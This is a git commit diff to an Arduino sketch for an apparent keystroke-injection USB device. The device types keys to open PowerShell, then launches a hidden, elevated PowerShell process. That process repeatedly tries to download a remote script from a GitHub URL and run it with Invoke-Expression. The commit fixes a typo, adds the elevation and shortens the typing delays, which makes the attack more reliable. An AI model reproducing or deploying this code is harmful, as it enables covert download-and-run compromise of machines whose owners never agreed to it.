34b9c59908303d9231ec8884e6d713eebdbfa0ae
MiHaniKo <139514821+NotiLo-A@users.noreply.github.com>
2025-03-11 13:15:16 +0300

    Update sketch.ino

--- sketch/sketch.ino
+++ sketch/sketch.ino
@@ -2,23 +2,20 @@
 
 
 static const char *command = R"(
-$main_scirpt_url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/refs/heads/main/scripts/main.ps1"
-
 $command_to_run = @"
-     while ($true) {
-        try {
-            Test-Connection github.com -Count 1 -ErrorAction Stop;
-            Invoke-Expression (
-                Invoke-WebRequest -Uri $main_script_url -UseBasicParsing | Select-Object -ExpandProperty Content
-            );
-            break
-        } catch {
-            Start-Sleep -Seconds 10
-        }
+while (`$true) {
+    try {
+        Test-Connection github.com -Count 1 -ErrorAction Stop
+        `$script = Invoke-WebRequest -Uri https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/scripts/main.ps1 -UseBasicParsing
+        Invoke-Expression (`$script.Content)
+        break
+    } catch {
+        Start-Sleep -Seconds 10
     }
+}
 "@
 
-Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command $command_to_run";
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command $command_to_run" -Verb RunAs
 exit
 )";
 
@@ -30,7 +27,7 @@ void setup() {
     // Reset Keyboard Layout to QWERTY
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.write(' ');
-    delay(500);
+    delay(200);
     Keyboard.write('2');
     Keyboard.releaseAll();
     delay(100); // TODO: consider removing
@@ -42,7 +39,7 @@ void setup() {
     Keyboard.releaseAll();
     delay(100);
     Keyboard.print("PowerShell");
-    delay(400);
+    delay(200);
 
     // Run as Root
     Keyboard.press(KEY_LEFT_CTRL);
